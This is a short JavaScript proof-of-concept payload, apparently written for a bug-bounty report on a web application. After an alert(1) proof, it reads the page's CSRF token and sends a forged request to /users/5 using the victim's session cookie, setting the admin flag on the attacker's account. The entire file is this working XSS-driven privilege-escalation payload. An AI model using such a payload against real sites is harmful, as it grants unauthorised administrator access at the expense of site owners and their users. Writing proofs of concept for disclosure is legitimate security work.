// For visual proof
alert(1)

// Privilege escalation script
const csrf = document
    .querySelector('meta[name="csrf-token"]')
    ?.getAttribute("content");

async function escalatePrivileges() {
    console.log("Attempting to escalate privileges...");
    if (!csrf) {
        throw new Error("CSRF token not found");
    }

    const body = new URLSearchParams({
        _method: "put",
        authenticity_token: csrf,
        "user[login]": "user2",
        "user[firstname]": "u2",
        "user[lastname]": "usertwo",
        "user[mail]": "testywhtriage@gmail.com",
        "user[language]": "en",
        "user[admin]": "1",
        "user[password]": "",
        "user[password_confirmation]": "",
        "send_information": "1",
        "user[force_password_change]": "0",
        "pref[time_zone]": "Etc/UTC",
        "pref[theme]": "light",
        "pref[disable_keyboard_shortcuts]": "0",
        button: "",
    });

    // Replace target user id with attacker id, the id was 5 in my case
    await fetch(`/users/5`, {
        method: "POST",
        credentials: "include", // send session cookie
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        },
        body: body.toString(),
    });
}

escalatePrivileges();
